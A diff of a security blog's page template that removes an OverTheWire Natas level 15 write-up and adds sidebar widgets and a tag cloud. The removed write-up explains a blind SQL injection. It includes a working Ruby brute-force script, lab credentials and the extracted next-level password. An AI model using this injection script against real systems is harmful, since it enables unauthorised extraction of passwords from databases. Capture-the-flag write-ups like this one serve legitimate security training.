@@ -91,189 +91,520 @@
 		<div style='clear: both;'></div>
 	</div>
 	
+	<div style='clear: both;'></div>
+	<div id="outer-wrapper" class="index home">
 
-<div id="main">
-  <div id="content">
-    <div>
-      <article class="hentry" role="article">
+<div class='row' id='content-wrapper'>
+    <div id='main-wrapper'>
+      <div class='main section' id='main'>
+      
+
 
         
-        
-
-        <div class="entry-content">
-          
-          
-          
-          <p>Up until now, none of the OverTheWire Natas challenges really gave me that much of an issue. This one however, took me a couple hours to complete. Level 15 is a fun blind sql-injection vulnerability.</p>
-
-<!-- more -->
-
-<p>It starts out with a username check dialog, which pretty much only gives you a binary value as to if a username exists or not.</p>
 
 
-<figure class="img-responsive">
-    
-        <img src="/img/natas15_1.png" />
-    
-    
-</figure>
-
-
-<p>I looked at the source code, and couldn&rsquo;t see any way to inject some SQL to get it to retrieve the password for me.</p>
-
-<pre><code>&lt;html&gt; 
-&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt; 
-&lt;body&gt; 
-&lt;h1&gt;natas15&lt;/h1&gt; 
-&lt;div id=&quot;content&quot;&gt; 
-&lt;? 
-
-/* 
-CREATE TABLE `users` ( 
-  `username` varchar(64) DEFAULT NULL, 
-  `password` varchar(64) DEFAULT NULL 
-); 
-*/ 
-
-if(array_key_exists(&quot;username&quot;, $_REQUEST)) { 
-    $link = mysql_connect('localhost', 'natas15', '&lt;censored&gt;'); 
-    mysql_select_db('natas15', $link); 
-     
-    $query = &quot;SELECT * from users where username=\&quot;&quot;.$_REQUEST[&quot;username&quot;].&quot;\&quot;&quot;; 
-    if(array_key_exists(&quot;debug&quot;, $_GET)) { 
-        echo &quot;Executing query: $query&lt;br&gt;&quot;; 
-    } 
-
-    $res = mysql_query($query, $link); 
-    if($res) { 
-    if(mysql_num_rows($res) &gt; 0) { 
-        echo &quot;This user exists.&lt;br&gt;&quot;; 
-    } else { 
-        echo &quot;This user doesn't exist.&lt;br&gt;&quot;; 
-    } 
-    } else { 
-        echo &quot;Error in query.&lt;br&gt;&quot;; 
-    } 
-
-    mysql_close($link); 
-} else { 
-?&gt; 
-
-&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt; 
-Username: &lt;input name=&quot;username&quot;&gt;&lt;br&gt; 
-&lt;input type=&quot;submit&quot; value=&quot;Check existence&quot; /&gt; 
-&lt;/form&gt; 
-&lt;? } ?&gt; 
-&lt;div id=&quot;viewsource&quot;&gt;&lt;a href=&quot;index-source.html&quot;&gt;View sourcecode&lt;/a&gt;&lt;/div&gt; 
-&lt;/div&gt; 
-&lt;/body&gt; 
-&lt;/html&gt; 
-</code></pre>
-
-<p>I did notice though, that it would verify that a row was returned, so I could inject SQL to brute-force the password. Assuming that the password was 32 digits long (like the previous ones), this could take some time however, since the character set was uppercase, lowercase, and digits. That&rsquo;s up to 62 attempts per digit of the password. I started doing this manually to verify that this was a possibility. With the &ldquo;debug&rdquo; flag on, you can see the query, and that the first digit of the password is not &ldquo;b&rdquo;.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/natas15_1.png" />
-    
-    
-</figure>
-
-
-<p>I cycled through manually all the lowercase and upper case letters. Once I got partially through the numbers, I got a successful hit! This means that the password starts with a &ldquo;3&rdquo;.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/natas15_1.png" />
-    
-    
-</figure>
-
-
-<p>The next step for me, was to automate this process. I decided to write some ruby to accomplish it. This code seems to do the job:</p>
-
-<pre><code>require 'uri'
-require 'net/http'
-
-url = URI.parse(&quot;http://natas15.natas.labs.overthewire.org/index.php&quot;)
-http = Net::HTTP.new(url.host, url.port)
-chars = ('a'..'z').to_a + ('A'..'Z').to_a + ('0'..'9').to_a
-password = &quot;&quot;
-found = false
-
-# 64 was selected, since the password field is a varchar(64)
-# Most likely, since all other passwords were 32 digits long, it'll be that
-(1..64).each do |i|
- chars.each do |c| 
-  found = false
-  request = Net::HTTP::Post.new(url.request_uri)
-  request.basic_auth(&quot;natas15&quot;, &quot;m2azll7JH6HS8Ay3SOjG3AGGlDGTJSTV&quot;)
-  query = 'natas16&quot; AND SUBSTRING(password, ' + i.to_s + ', 1) LIKE BINARY &quot;' + c
-  request.set_form_data({&quot;username&quot; =&gt; query})
-  response = http.request(request)
-
-  if response.body.include?(&quot;This user exists&quot;)
-   password += c
-   found = true
-   puts &quot;Current pass: #{password}&quot;
-   break
-  end
- end
- # If no letter/number was found, it's fairly safe to assume it's done
- break if !found
-end
-
-</code></pre>
-
-<p>The output shows:</p>
-
-<pre><code>mandreko$ ruby natas15.rb
-Current pass: 3
-Current pass: 3V
-Current pass: 3Vf
-Current pass: 3VfC
-Current pass: 3VfCz
-Current pass: 3VfCzg
-Current pass: 3VfCzga
-Current pass: 3VfCzgaW
-Current pass: 3VfCzgaWj
-Current pass: 3VfCzgaWjE
-Current pass: 3VfCzgaWjEA
-Current pass: 3VfCzgaWjEAc
-Current pass: 3VfCzgaWjEAcm
-Current pass: 3VfCzgaWjEAcmC
-Current pass: 3VfCzgaWjEAcmCQ
-Current pass: 3VfCzgaWjEAcmCQp
-Current pass: 3VfCzgaWjEAcmCQph
-Current pass: 3VfCzgaWjEAcmCQphi
-Current pass: 3VfCzgaWjEAcmCQphiE
-Current pass: 3VfCzgaWjEAcmCQphiEP
-Current pass: 3VfCzgaWjEAcmCQphiEPo
-Current pass: 3VfCzgaWjEAcmCQphiEPoX
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9H
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Ht
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htl
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9Htlm
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmV
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3
-Current pass: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L
-</code></pre>
-
-<p>And there you go, the password for level 16 shows up as the last line before it quits.</p>
-
-        </div>
-        
-      </article>
+      
+      </div>
     </div>
     
-  </div>
+    <div id='sidebar-wrapper'>
+      <div class='sidebar ready-widget section' id='sidebar'>
+        <div class='widget HTML' data-version='1' id='HTML3'>
+	<h2 class='title'>Author</h2>
+	<div class='widget-content'>
+		<div class="sidebar_about_author">
+			<div class="inner_wrapper">
+				<div class="aboutme-img">
+					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
+				</div>
+			</div>
+			<div class="aboutme-info">
+				<h4>Matt Andreko</h4>
+				<p>Security Consultant</p>
+			</div>
+		</div>
+	</div>
+	<div class='clear'></div>
 </div>
+        <div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+	<h2>Popular Articles</h2>
+	<div class='widget-content popular-posts'>
+		<ul>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>
+							<img alt='LOVE WRITING AND SHARING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>SOME BLOG POST 1</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>
+							<img alt='THE ULTIMATE CONSUMERS' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>SOME BLOG POST 2</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>
+							<img alt='IT IS BEYOND BLOGGING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>SOME BLOG POST 3</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>
+							<img alt='STARBUCKS REPRESENTS SOMETHING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>SOME BLOG POST 4</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+		</ul>
+		<div class='clear'></div>
+	</div>
+</div>
+        <div class='widget HTML' data-version='1' id='HTML2'>
+	<h2 class='title'>Featured</h2>
+	<div class='widget-content'>
+		<span class="labelpost" data-label="Magazine" data-no="4"></span>
+	</div>
+	<div class='clear'></div>
+	<span class='widget-item-control'>
+		<span class='item-control blog-admin'>
+			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
+				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+			</a>
+		</span>
+	</span>
+	<div class='clear'></div>
+</div>
+        <div class='widget Label' data-version='1' id='Label1'>
+	<h2>Categories</h2>
+	<div class='widget-content cloud-label-widget-content'>
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/antivirus'>antivirus</a>
+			</span>
 
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/aslr'>aslr</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/assembly'>assembly</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/brainpan'>brainpan</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/browsers'>browsers</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/burp'>burp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/canon'>canon</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/certification'>certification</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/commandinjection'>commandinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cookies'>cookies</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/csharp'>csharp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ctp'>ctp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cucumber'>cucumber</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/directorytraversal'>directorytraversal</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dos'>dos</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dotnet'>dotnet</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/encoding'>encoding</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exif'>exif</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit'>exploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fail'>fail</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fogbugz'>fogbugz</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/food'>food</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/formatstring'>formatstring</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fusion'>fusion</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/future'>future</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/gac'>gac</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/getoffmylawn'>getoffmylawn</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/greasemonkey'>greasemonkey</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hacking'>hacking</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/heap'>heap</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hexchat'>hexchat</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hover'>hover</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/html'>html</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/http'>http</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/includes'>includes</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/injection'>injection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/iphone'>iphone</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/kioptrix'>kioptrix</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/linux'>linux</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/metasploit'>metasploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/mips'>mips</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/monxla'>monxla</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/natas'>natas</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/nebula'>nebula</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/net'>net</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/offsec'>offsec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/oscp'>oscp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/osx'>osx</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/php'>php</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/printer'>printer</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/projects'>projects</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/protostar'>protostar</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwb'>pwb</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwcrack'>pwcrack</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rails'>rails</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rant'>rant</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2libc'>ret2libc</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2text'>ret2text</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rop'>rop</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rspec'>rspec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/security'>security</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/shellcode'>shellcode</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sprint'>sprint</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sqlinjection'>sqlinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ssh'>ssh</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/suid'>suid</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sysax'>sysax</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/tdd'>tdd</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/testing'>testing</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/til'>til</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ui'>ui</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/userscript'>userscript</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/vim'>vim</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/wargames'>wargames</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/windows'>windows</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xor'>xor</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xss'>xss</a>
+			</span>
+
+		
+		<div class='clear'></div>
+	</div>
+</div>
+      </div>
+    </div>
+    <div style='clear: both;'></div>
+  </div>
+
+
+
+
+
+		</div>
 		
 		<div id='w2t_footer'>
 			<div class='w2t-copy-container row'>
